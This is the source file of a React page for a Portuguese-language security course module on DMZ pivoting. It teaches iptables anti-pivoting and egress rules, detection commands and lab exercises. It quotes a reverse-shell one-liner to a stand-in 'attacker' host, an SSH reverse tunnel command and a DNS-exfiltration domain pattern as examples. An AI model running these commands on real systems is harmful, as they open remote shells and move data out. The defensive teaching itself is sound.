'use client';

import React, { useEffect } from 'react';
import Link from 'next/link';
import { motion } from 'motion/react';
import { ShieldAlert, ShieldCheck, Terminal, Info, AlertTriangle, ArrowRightLeft, Skull, Network, Lock, Eye } from 'lucide-react';
import { cn } from '@/lib/utils';
import { CodeBlock } from '@/components/ui/CodeBlock';
import { InfoBox, WarnBox, WindowsComparisonBox } from '@/components/ui/Boxes';
import { FluxoCard } from '@/components/ui/FluxoCard';
import { ModuleNav } from '@/components/ui/ModuleNav';
import { useBadges } from '@/context/BadgeContext';

const CHECKLIST = [
  { id: 'pivote-forward-drop', text: 'Aplicou regra FORWARD DROP impedindo DMZ → LAN e testou com ping' },
  { id: 'pivote-egress',       text: 'Configurou egress filtering: DMZ só acessa portas 80/443 na internet' },
  { id: 'pivote-honeypot',     text: 'Compreendeu como SSH tunneling e DNS tunneling contornam firewalls ingress-only' },
];

const ATTACK_CHAIN = [
  { label: 'Exploração Web', sub: 'RCE via PHP/app', icon: <ShieldAlert size={14} />, color: 'border-err/50' },
  { label: 'Shell Reverso',  sub: 'bash -i >& /dev/tcp', icon: <Terminal size={14} />, color: 'border-err/50' },
  { label: 'Recon Interno',  sub: 'nmap -sn 192.168.57.0/24', icon: <Eye size={14} />, color: 'border-warn/50' },
  { label: 'Mov. Lateral',   sub: 'SSH / SMB / RDP → LAN', icon: <ArrowRightLeft size={14} />, color: 'border-warn/50' },
  { label: 'Persistência',   sub: 'crontab / authorized_keys', icon: <Lock size={14} />, color: 'border-info/50' },
  { label: 'Exfiltração',    sub: 'DNS tunnel / HTTPS C2', icon: <Network size={14} />, color: 'border-ok/50' },
];

export default function PivotingPage() {
  const { trackPageVisit, unlockBadge, checklist, updateChecklist } = useBadges();

  useEffect(() => {
    trackPageVisit('pivoteamento');
    unlockBadge('pivoting-master');
  }, [trackPageVisit, unlockBadge]);

  return (
    <div className="max-w-7xl mx-auto px-4 py-12 module-accent-pivoteamento">
      <div className="breadcrumb mb-8 module-hero">
        <Link href="/">Início</Link>
        <span>/</span>
        <Link href="/topicos">Tópicos</Link>
        <span>/</span>
        <span className="text-text-2">Pivoteamento DMZ → LAN</span>
      </div>

      <div className="section-label text-err">Conteúdo Avançado</div>
      <h1 className="section-title flex items-center gap-3">
        <Skull className="text-err" size={32} />
        Pivoteamento: O Perigo da DMZ
      </h1>
      <p className="section-sub">
        O que acontece se o seu Web Server for invadido? Se as regras de firewall não forem restritivas,
        o invasor usará o servidor comprometido como &quot;ponte&quot; (pivô) para atacar a rede interna (LAN).
        Este módulo mostra a cadeia de ataque completa e as defesas iptables que a cortam em cada etapa.
      </p>

      <WarnBox title="Objetivo educacional">
        Este conteúdo existe para que você saiba defender sua infraestrutura. Nunca aplique técnicas
        ofensivas em redes sem autorização explícita por escrito. Ataques não autorizados são crime.
      </WarnBox>

      <div className="mt-10">
        <FluxoCard
          title="Cadeia de Pivoteamento — 6 Etapas"
          steps={ATTACK_CHAIN}
        />
      </div>

      <div className="grid lg:grid-cols-[1fr_350px] gap-12 mt-12">
        <div className="space-y-16">

          {/* 1. O Cenário */}
          <section id="cenario">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-lg bg-err/10 flex items-center justify-center text-err">
                <AlertTriangle size={24} />
              </div>
              <h2 className="text-2xl font-bold">1. O Vetor de Ataque</h2>
            </div>

            <p className="text-text-2 mb-6">
              O atacante não precisa invadir o firewall diretamente — ele explora uma
              vulnerabilidade na aplicação web (PHP, Node.js, upload inseguro) para obter
              um shell no servidor da DMZ. A partir daí, a rede interna fica exposta se as
              regras FORWARD não forem restritivas.
            </p>

            <div className="bg-bg-2 border border-border rounded-xl p-8 relative overflow-hidden">
              <div className="relative z-10 space-y-6">
                <div className="flex flex-wrap items-center gap-3 text-sm font-mono">
                  <div className="px-3 py-1 rounded bg-bg-3 border border-border text-text-3">Atacante (WAN)</div>
                  <ArrowRightLeft size={16} className="text-err" />
                  <div className="px-3 py-1 rounded bg-err/10 border border-err/30 text-err">Web Server DMZ (comprometido)</div>
                  <ArrowRightLeft size={16} className="text-err" />
                  <div className="px-3 py-1 rounded bg-info/10 border border-info/30 text-info">LAN (192.168.57.0/24)</div>
                </div>

                <div className="grid md:grid-cols-2 gap-4">
                  <div className="p-4 rounded-lg bg-bg-3 border border-border">
                    <h4 className="font-bold text-xs uppercase text-err mb-2">O que o invasor faz na DMZ</h4>
                    <ul className="text-xs text-text-2 space-y-1">
                      <li>• <code>nmap -sn 192.168.57.0/24</code> — descobre hosts LAN</li>
                      <li>• Testa SSH/SMB/RDP nas máquinas internas</li>
                      <li>• Monta túnel SSH reverso para C2 externo</li>
                      <li>• Usa DNS tunneling para exfiltrar dados</li>
                    </ul>
                  </div>
                  <div className="p-4 rounded-lg bg-bg-3 border border-border">
                    <h4 className="font-bold text-xs uppercase text-ok mb-2">Firewall ideal bloqueia em</h4>
                    <ul className="text-xs text-text-2 space-y-1">
                      <li>• <strong>FORWARD</strong>: DMZ → LAN NEW = DROP</li>
                      <li>• <strong>FORWARD</strong>: DMZ → WAN limitado por porta</li>
                      <li>• <strong>OUTPUT</strong>: servidor não resolve DNS externo livre</li>
                      <li>• <strong>Fail2ban</strong>: detecta scan de portas interno</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* 2. Defesa FORWARD DROP */}
          <section id="forward-drop">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-lg bg-ok/10 flex items-center justify-center text-ok">
                <ShieldCheck size={24} />
              </div>
              <h2 className="text-2xl font-bold">2. FORWARD DROP — Muralha DMZ → LAN</h2>
            </div>

            <p className="text-text-2 mb-4">
              A regra de ouro: <strong>A DMZ nunca inicia conexões para a LAN, ela apenas responde.</strong>
              Isso é implementado bloqueando pacotes com estado NEW no FORWARD de DMZ para LAN.
            </p>

            <CodeBlock lang="bash" code={`# ============================================================
# REGRAS ESSENCIAIS ANTI-PIVOTEAMENTO
# ============================================================

# 1. Bloquear QUALQUER nova conexão saindo da DMZ → LAN
iptables -A FORWARD -s 192.168.56.0/24 -d 192.168.57.0/24 \\
  -m state --state NEW -j DROP

# Logar tentativas de pivoteamento para análise forense
iptables -A FORWARD -s 192.168.56.0/24 -d 192.168.57.0/24 \\
  -m limit --limit 3/min -j LOG --log-prefix "[PIVOT-ATTEMPT] "

# 2. Permitir LAN → DMZ (usuários acessam o site normalmente)
iptables -A FORWARD -s 192.168.57.0/24 -d 192.168.56.0/24 -j ACCEPT

# 3. Respostas estabelecidas voltam normalmente (HTTP 200, etc.)
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# Verificar se as regras estão ativas:
iptables -L FORWARD -n -v | grep -E "DROP|ACCEPT"

# Teste: do Web Server, tentar alcançar o cliente LAN (deve FALHAR):
# web$ ping -c 3 192.168.57.50
# PING 192.168.57.50: Destination Port Unreachable`} />

            <InfoBox title="Por que --state NEW é a chave?">
              Sem <code>--state NEW</code>, você bloquearia também as respostas de
              conexões legítimas que a LAN iniciou (HTTP → servidor). Com NEW, só
              bloqueia pacotes que iniciam uma nova sessão vindo da DMZ — exatamente
              o que o pivoteamento precisa.
            </InfoBox>
          </section>

          {/* 3. Egress Filtering */}
          <section id="egress">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-lg bg-warn/10 flex items-center justify-center text-warn">
                <Network size={24} />
              </div>
              <h2 className="text-2xl font-bold">3. Egress Filtering — Fechar o Caminho de Saída</h2>
            </div>

            <p className="text-text-2 mb-4">
              Um servidor web legítimo precisa de HTTP/HTTPS para baixar atualizações e
              NTP para sincronizar o relógio — e nada mais. Limitar a saída da DMZ corta
              reverse shells, DNS tunneling e comunicação C2 na maioria dos casos.
            </p>

            <CodeBlock lang="bash" code={`# ============================================================
# EGRESS FILTERING — DMZ → Internet
# ============================================================

# Definir política padrão: DMZ não sai para a internet por padrão
# (já coberto se a policy FORWARD for DROP)

# Permitir apenas: atualizações apt (HTTP/HTTPS) e NTP
iptables -A FORWARD -s 192.168.56.0/24 -o eth0 \\
  -p tcp --dport 80 -j ACCEPT

iptables -A FORWARD -s 192.168.56.0/24 -o eth0 \\
  -p tcp --dport 443 -j ACCEPT

iptables -A FORWARD -s 192.168.56.0/24 -o eth0 \\
  -p udp --dport 123 -j ACCEPT   # NTP

# Bloquear TUDO o mais saindo da DMZ para WAN
iptables -A FORWARD -s 192.168.56.0/24 -o eth0 -j DROP

# ============================================================
# Defesa contra DNS Tunneling — Forçar uso do seu DNS interno
# ============================================================

# Redirecionar DNS da DMZ para o seu resolver interno (não 8.8.8.8)
iptables -t nat -A PREROUTING -s 192.168.56.0/24 \\
  -p udp --dport 53 -j DNAT --to-destination 192.168.57.1:53

# Bloquear DNS direto para internet da DMZ (anti-tunneling)
iptables -A FORWARD -s 192.168.56.0/24 -p udp --dport 53 \\
  -d ! 192.168.57.1 -j DROP`} />

            <WarnBox title="DNS Tunneling: a evasão mais silenciosa">
              Ferramentas como <code>iodine</code> e <code>dnscat2</code> codificam dados
              em queries DNS para contornar firewalls que só bloqueiam TCP/UDP. Se a DMZ
              consegue resolver nomes externos diretamente, um atacante pode exfiltrar
              gigabytes de dados em queries do tipo <code>dados.base64.c2.attacker.com</code>.
              Force o DNS da DMZ para passar pelo seu resolver interno.
            </WarnBox>
          </section>

          {/* 4. SSH Tunneling / Técnicas de Evasão */}
          <section id="evasao">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-lg bg-info/10 flex items-center justify-center text-info">
                <Lock size={24} />
              </div>
              <h2 className="text-2xl font-bold">4. Técnicas de Evasão e Como Detectá-las</h2>
            </div>

            <p className="text-text-2 mb-6">
              Atacantes sofisticados sabem contornar regras de ingress ingênuas. Veja as
              técnicas mais comuns e como o egress filtering correto as bloqueia.
            </p>

            <div className="space-y-6">
              <div className="bg-bg-2 border border-border rounded-xl overflow-hidden">
                <div className="bg-bg-3 px-5 py-3 border-b border-border">
                  <h3 className="font-bold text-sm">Técnicas de Evasão vs. Defesa</h3>
                </div>
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="bg-bg-3 border-b border-border">
                      <th className="p-4 text-xs font-bold uppercase tracking-widest text-err">Técnica</th>
                      <th className="p-4 text-xs font-bold uppercase tracking-widest text-text-3">Como Funciona</th>
                      <th className="p-4 text-xs font-bold uppercase tracking-widest text-ok">Defesa</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-border text-sm">
                    <tr>
                      <td className="p-4 font-mono text-err text-xs">Reverse Shell TCP</td>
                      <td className="p-4 text-xs text-text-2"><code>bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1</code></td>
                      <td className="p-4 text-xs text-ok">Egress DROP; apenas 80/443/123 permitidos</td>
                    </tr>
                    <tr>
                      <td className="p-4 font-mono text-err text-xs">SSH Reverse Tunnel</td>
                      <td className="p-4 text-xs text-text-2"><code>ssh -R 4444:localhost:22 attacker</code> via porta 443</td>
                      <td className="p-4 text-xs text-ok">Inspecção TLS (deep packet) + bloquear SSH outbound</td>
                    </tr>
                    <tr>
                      <td className="p-4 font-mono text-err text-xs">DNS Tunneling</td>
                      <td className="p-4 text-xs text-text-2">iodine / dnscat2 — dados em subdomain queries</td>
                      <td className="p-4 text-xs text-ok">Forçar DNS interno + rate limit de queries DNS</td>
                    </tr>
                    <tr>
                      <td className="p-4 font-mono text-err text-xs">ICMP Tunnel</td>
                      <td className="p-4 text-xs text-text-2">ptunnel-ng — dados em payload de echo request</td>
                      <td className="p-4 text-xs text-ok">Bloquear ICMP saindo da DMZ exceto ping limitado</td>
                    </tr>
                    <tr>
                      <td className="p-4 font-mono text-err text-xs">HTTP C2</td>
                      <td className="p-4 text-xs text-text-2">Cobalt Strike beacon via HTTPS para 443</td>
                      <td className="p-4 text-xs text-ok">Web proxy com TLS inspection + allowlist de domínios</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <CodeBlock lang="bash" code={`# ============================================================
# DETECÇÃO: monitorar tentativas de pivoteamento nos logs
# ============================================================

# Ver tentativas de conexão da DMZ bloqueadas pelo iptables:
journalctl -k | grep "PIVOT-ATTEMPT"

# Monitorar conexões ativas saindo do servidor DMZ:
# (executar NO PRÓPRIO servidor da DMZ)
ss -tnp | grep ESTABLISHED

# Detectar binários suspeitos em execução na DMZ:
ps aux | grep -E "nc|ncat|nmap|iodine|dnscat|ptunnel"

# Verificar cron jobs adicionados pelo invasor:
crontab -l
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# Verificar chaves SSH adicionadas (backdoor persistente):
find / -name "authorized_keys" 2>/dev/null | xargs cat

# Auditd: detectar chamadas de sistema suspeitas em tempo real
auditctl -a always,exit -F arch=b64 -S connect -k net-connect`} />
            </div>
          </section>

          {/* 5. Defesa em profundidade */}
          <section id="defesa-profundidade">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-lg bg-accent/10 flex items-center justify-center text-accent">
                <ShieldCheck size={24} />
              </div>
              <h2 className="text-2xl font-bold">5. Defesa em Profundidade</h2>
            </div>

            <p className="text-text-2 mb-6">
              Firewall é a primeira linha. Uma defesa real usa múltiplas camadas que o
              atacante precisa superar sequencialmente.
            </p>

            <CodeBlock lang="bash" code={`# ============================================================
# SCRIPT COMPLETO: anti-pivoteamento para ambiente lab
# ============================================================
# Topologia: eth0=WAN, eth1=DMZ(192.168.56.0/24), eth2=LAN(192.168.57.0/24)

# Políticas restritivas
iptables -P INPUT   DROP
iptables -P FORWARD DROP
iptables -P OUTPUT  ACCEPT

# Loopback sempre livre
iptables -A INPUT -i lo -j ACCEPT

# FORWARD: estado estabelecido passa (respostas legítimas)
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# LAN pode acessar DMZ (usuários → web server)
iptables -A FORWARD -s 192.168.57.0/24 -d 192.168.56.0/24 \\
  -m state --state NEW -j ACCEPT

# DMZ → LAN: BLOQUEADO (anti-pivoteamento)
iptables -A FORWARD -s 192.168.56.0/24 -d 192.168.57.0/24 \\
  -m limit --limit 3/min -j LOG --log-prefix "[PIVOT-ATTEMPT] "
iptables -A FORWARD -s 192.168.56.0/24 -d 192.168.57.0/24 -j DROP

# Egress DMZ: apenas HTTP/HTTPS/NTP para internet
iptables -A FORWARD -s 192.168.56.0/24 -o eth0 \\
  -p tcp -m multiport --dports 80,443 -j ACCEPT
iptables -A FORWARD -s 192.168.56.0/24 -o eth0 \\
  -p udp --dport 123 -j ACCEPT
iptables -A FORWARD -s 192.168.56.0/24 -o eth0 -j DROP

# Forçar DNS da DMZ para resolver interno
iptables -t nat -A PREROUTING -i eth1 -p udp --dport 53 \\
  -j DNAT --to-destination 192.168.57.1:53

echo "Regras anti-pivoteamento ativas."
iptables -L FORWARD -n --line-numbers`} />

            <WindowsComparisonBox
              windowsCode={`# Windows — Isolamento de rede (Hyper-V / Azure NSG)

# Hyper-V: VLAN separada por switch virtual
Get-VMSwitch | Select-Object Name, SwitchType

# Azure NSG: regra equivalente ao FORWARD DROP
# Negar tráfego entre subnets (DMZ → LAN)
az network nsg rule create \\
  --nsg-name nsg-dmz \\
  --name deny-dmz-to-lan \\
  --priority 100 \\
  --source-address-prefix 10.0.1.0/24 \\
  --destination-address-prefix 10.0.2.0/24 \\
  --access Deny \\
  --direction Outbound

# Windows Firewall com política de isolamento:
# netsh advfirewall firewall add rule
#   name="Block DMZ to LAN"
#   dir=in action=block
#   remoteip=192.168.56.0/24
#   localip=192.168.57.0/24`}
              linuxCode={`# Linux iptables — FORWARD DROP anti-pivoteamento

# DMZ (eth1 / 192.168.56.0/24) nunca inicia conexões → LAN
iptables -A FORWARD \\
  -s 192.168.56.0/24 \\
  -d 192.168.57.0/24 \\
  -m state --state NEW \\
  -j DROP

# Log tentativas para análise forense
iptables -A FORWARD \\
  -s 192.168.56.0/24 \\
  -d 192.168.57.0/24 \\
  -m limit --limit 3/min \\
  -j LOG --log-prefix "[PIVOT] "

# Verificar regras ativas:
iptables -L FORWARD -n -v --line-numbers`}
              windowsLabel="Windows / Azure NSG"
              linuxLabel="Linux iptables"
            />
          </section>

          {/* Exercícios */}
          <section id="exercicios">
            <h2 className="text-2xl font-bold mb-6">Exercícios Guiados</h2>
            <div className="space-y-4">
              {[
                {
                  n: 1,
                  title: 'Bloquear FORWARD DMZ → LAN',
                  steps: [
                    'Aplique a regra FORWARD DROP para 192.168.56.0/24 → 192.168.57.0/24',
                    'No Web Server (DMZ): `ping -c 3 192.168.57.50` — deve falhar',
                    'No Cliente (LAN): `curl http://192.168.56.10` — deve funcionar',
                    'Ver log: `journalctl -k | grep PIVOT` após tentativa',
                  ],
                },
                {
                  n: 2,
                  title: 'Testar Egress Filtering',
                  steps: [
                    'Aplique as regras de egress (80/443/123 para WAN, resto DROP)',
                    'No Web Server: `curl https://google.com` — deve funcionar',
                    'No Web Server: `nc -zv 1.1.1.1 4444` — deve falhar (egress bloqueado)',
                    'No Web Server: `dig @8.8.8.8 example.com` — deve ir para seu DNS interno',
                  ],
                },
                {
                  n: 3,
                  title: 'Simular Detecção de Backdoor',
                  steps: [
                    'No Web Server: adicione uma entrada suspeita em `crontab -e`',
                    'No Firewall: observe os logs do auditd ou iptables',
                    'Execute: `ss -tnp | grep ESTABLISHED` para ver conexões ativas',
                    'Remoção: `crontab -r` e audite `~/.ssh/authorized_keys`',
                  ],
                },
              ].map(ex => (
                <div key={ex.n} className="bg-bg-2 border border-border rounded-xl p-6">
                  <h3 className="font-bold mb-3 flex items-center gap-2">
                    <span className="w-6 h-6 rounded-full bg-accent/20 text-accent text-xs flex items-center justify-center font-bold">{ex.n}</span>
                    {ex.title}
                  </h3>
                  <ol className="space-y-1 text-sm text-text-2 list-decimal list-inside">
                    {ex.steps.map((s, i) => (
                      <li key={i}>{s}</li>
                    ))}
                  </ol>
                </div>
              ))}
            </div>
          </section>

          {/* Checklist */}
          <section id="checklist">
            <h2 className="text-2xl font-bold mb-6">Checklist do Lab</h2>
            <div className="space-y-3">
              {CHECKLIST.map(item => (
                <motion.label
                  key={item.id}
                  className={cn(
                    'flex items-start gap-3 p-4 rounded-xl border cursor-pointer transition-colors',
                    checklist[item.id]
                      ? 'bg-ok/10 border-ok/30'
                      : 'bg-bg-2 border-border hover:border-ok/30',
                  )}
                  whileTap={{ scale: 0.99 }}
                >
                  <input
                    type="checkbox"
                    className="sr-only"
                    checked={!!checklist[item.id]}
                    onChange={() => updateChecklist(item.id, !checklist[item.id])}
                  />
                  <span className={cn('mt-0.5 text-xl', checklist[item.id] ? 'text-ok' : 'text-text-3')}>
                    {checklist[item.id] ? '✅' : '⬜'}
                  </span>
                  <span className={cn('text-sm leading-relaxed', checklist[item.id] ? 'text-ok line-through' : 'text-text-2')}>
                    {item.text}
                  </span>
                </motion.label>
              ))}
            </div>
          </section>
        </div>

        {/* Sidebar */}
        <aside className="space-y-6">
          <div className="p-6 rounded-xl bg-bg-2 border border-border shadow-sm">
            <h3 className="font-bold text-sm mb-4 flex items-center gap-2">
              <Info size={16} className="text-accent" />
              Conceito Chave
            </h3>
            <p className="text-xs text-text-2 leading-relaxed mb-4">
              Em redes profissionais, a DMZ é considerada uma <strong>&quot;zona de sacrifício&quot;</strong>.
              Assumimos que ela <em>será</em> invadida e focamos em garantir que o invasor
              fique preso nela — sem acesso à LAN, sem comunicação com C2.
            </p>
            <div className="p-3 rounded-lg bg-err/5 border border-err/20 text-xs font-mono text-text-3">
              web$ ping 192.168.57.50<br />
              <span className="text-err">PING: Destination Unreachable</span>
            </div>
          </div>

          <div className="p-6 rounded-xl bg-bg-2 border border-border shadow-sm">
            <h3 className="font-bold text-sm mb-3 flex items-center gap-2">
              <ShieldAlert size={16} className="text-warn" />
              Indicadores de Comprometimento
            </h3>
            <ul className="text-xs text-text-2 space-y-2">
              <li className="flex items-start gap-2"><span className="text-err mt-0.5">⚠</span> Conexão SSH de saída do servidor web</li>
              <li className="flex items-start gap-2"><span className="text-err mt-0.5">⚠</span> nmap rodando dentro da DMZ</li>
              <li className="flex items-start gap-2"><span className="text-err mt-0.5">⚠</span> Queries DNS para domínios desconhecidos em alta frequência</li>
              <li className="flex items-start gap-2"><span className="text-err mt-0.5">⚠</span> Novo cronjob criado fora da janela de manutenção</li>
              <li className="flex items-start gap-2"><span className="text-err mt-0.5">⚠</span> Binário desconhecido em /tmp ou /dev/shm</li>
            </ul>
          </div>

          <div className="p-6 rounded-xl bg-bg-2 border border-border shadow-sm">
            <h3 className="font-bold text-sm mb-3">Ferramentas Ofensivas Comuns</h3>
            <div className="space-y-2 text-xs font-mono">
              {[
                { tool: 'nmap', uso: 'Reconhecimento de rede interna' },
                { tool: 'iodine', uso: 'DNS tunneling (exfil)' },
                { tool: 'dnscat2', uso: 'C2 via DNS queries' },
                { tool: 'ptunnel-ng', uso: 'Tunelamento via ICMP' },
                { tool: 'chisel', uso: 'TCP tunnel via HTTP/HTTPS' },
                { tool: 'ligolo-ng', uso: 'Proxy reverso para pentest' },
              ].map(({ tool, uso }) => (
                <div key={tool} className="flex justify-between gap-2">
                  <span className="text-accent-2">{tool}</span>
                  <span className="text-text-3 text-right">{uso}</span>
                </div>
              ))}
            </div>
          </div>
        </aside>
      </div>

      {/* ── Erros Comuns ── */}
      <div className="max-w-5xl mx-auto px-4 space-y-4 mb-8">
        <h2 className="text-2xl font-bold flex items-center gap-2">
          <span className="text-warn">⚠️</span> Erros de Defesa e Soluções
        </h2>
        {[
          {
            err: 'iptables FORWARD DROP bloqueia tráfego legítimo LAN→DMZ',
            fix: 'A política DROP precisa de regras ACCEPT explícitas. Adicionar antes do DROP: iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT. E regras específicas: iptables -A FORWARD -s 192.168.57.0/24 -d 192.168.56.10 -p tcp --dport 80 -j ACCEPT.',
          },
          {
            err: 'Túnel SSH reverso abre mesmo com AllowTcpForwarding no no sshd_config',
            fix: 'AllowTcpForwarding no bloqueia port forwarding padrão, mas GatewayPorts pode ainda estar habilitado. Adicionar também: GatewayPorts no e PermitTunnel no. Usar fail2ban para bloquear IPs que tentam múltiplas conexões SSH.',
          },
          {
            err: 'Regras anti-DNS-tunneling bloqueiam resolução DNS legítima',
            fix: 'O DNAT força todo DNS para o resolver interno (192.168.57.254), mas o resolver interno pode não estar respondendo. Verificar: dig @192.168.57.254 google.com. Se falhar, o problema é no servidor DNS interno, não nas regras iptables.',
          },
          {
            err: 'iptables LOG não aparece no syslog após adicionar a regra',
            fix: 'rsyslog pode estar filtrando kern.* para arquivo diferente. Verificar: grep kern /etc/rsyslog.conf. O kernel loga via kern.warning — verificar: dmesg | grep IPTABLES. Garantir que a regra LOG está ANTES da regra DROP/ACCEPT correspondente.',
          },
        ].map(({ err, fix }) => (
          <div key={err} className="border border-err/20 bg-err/5 rounded-xl p-5">
            <p className="font-mono text-sm text-err mb-2">❌ {err}</p>
            <p className="text-sm text-text-2">✅ {fix}</p>
          </div>
        ))}
      </div>

      {/* ── Exercícios Guiados ── */}
      <div className="space-y-4 mb-8">
        <h2 className="text-2xl font-bold mb-2">🎯 Exercícios Guiados</h2>
        <div className="grid gap-4">
          <div className="p-4 rounded-xl bg-bg-2 border border-border">
            <p className="font-bold text-sm mb-2">Lab 1 — Bloquear FORWARD DMZ → LAN</p>
            <CodeBlock lang="bash" code={`# Verificar política padrão do FORWARD
iptables -L FORWARD -n -v

# Definir política padrão DROP para FORWARD
iptables -P FORWARD DROP

# Verificar que DMZ não consegue mais atingir LAN
# (testar de VM na DMZ: ping 192.168.57.2)

# Permitir apenas tráfego específico de volta (ESTABLISHED/RELATED)
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# Logar tentativas de pivoteamento
iptables -A FORWARD -s 192.168.100.0/24 -d 192.168.57.0/24 \
  -j LOG --log-prefix "PIVOTE-TENTATIVA: " --log-level 4

# Verificar regras
iptables -L FORWARD -n -v

# Monitorar logs de tentativas de pivoteamento
journalctl -k | grep "PIVOTE-TENTATIVA" -f &`} />
          </div>
          <div className="p-4 rounded-xl bg-bg-2 border border-border">
            <p className="font-bold text-sm mb-2">Lab 2 — Egress Filtering — Controlar Saída da DMZ</p>
            <CodeBlock lang="bash" code={`# Ver tráfego de saída atual da DMZ
iptables -L OUTPUT -n -v

# Permitir apenas DNS (53 UDP/TCP) e HTTP/HTTPS da DMZ
iptables -A FORWARD -s 192.168.100.0/24 -p udp --dport 53 -j ACCEPT
iptables -A FORWARD -s 192.168.100.0/24 -p tcp --dport 53 -j ACCEPT
iptables -A FORWARD -s 192.168.100.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 192.168.100.0/24 -p tcp --dport 443 -j ACCEPT

# Bloquear DNS tuneling — forçar uso do DNS interno
iptables -t nat -A PREROUTING -i eth2 -p udp --dport 53 \
  ! -d 192.168.57.1 -j DNAT --to-destination 192.168.57.1:53

# Listar regras de forwarding
iptables -L FORWARD -n -v

# Testar da DMZ (deve funcionar só DNS e HTTP/HTTPS)
# ping 8.8.8.8 → deve falhar (ICMP bloqueado)
# curl http://google.com → deve funcionar`} />
          </div>
          <div className="p-4 rounded-xl bg-bg-2 border border-border">
            <p className="font-bold text-sm mb-2">Lab 3 — Detectar e Responder a Pivoteamento</p>
            <CodeBlock lang="bash" code={`# Instalar ferramentas de detecção
apt install rkhunter aide -y 2>/dev/null || true

# Script de detecção de conexões suspeitas na DMZ
cat > /usr/local/bin/detecta-pivote.sh << 'SCRIPT'
#!/bin/bash
LOG="/var/log/pivote-detect.log"
echo "=== Verificação $(date) ===" >> "$LOG"

# Conexões ativas na DMZ (suspeito se houver para rede LAN)
ss -tunaph | grep "192.168.57" >> "$LOG" && \
  echo "⚠️  ALERTA: Conexões da DMZ para LAN detectadas!" >> "$LOG"

# Processos com conexões de rede suspeitas
ss -tupn | grep -v "127.0.0.1\|::1" >> "$LOG"

# Verificar usuários logados
who >> "$LOG"
last | head -5 >> "$LOG"
SCRIPT

chmod +x /usr/local/bin/detecta-pivote.sh
/usr/local/bin/detecta-pivote.sh
cat /var/log/pivote-detect.log`} />
          </div>
        </div>
      </div>

      <ModuleNav currentPath="/pivoteamento" />
    </div>
  );
}
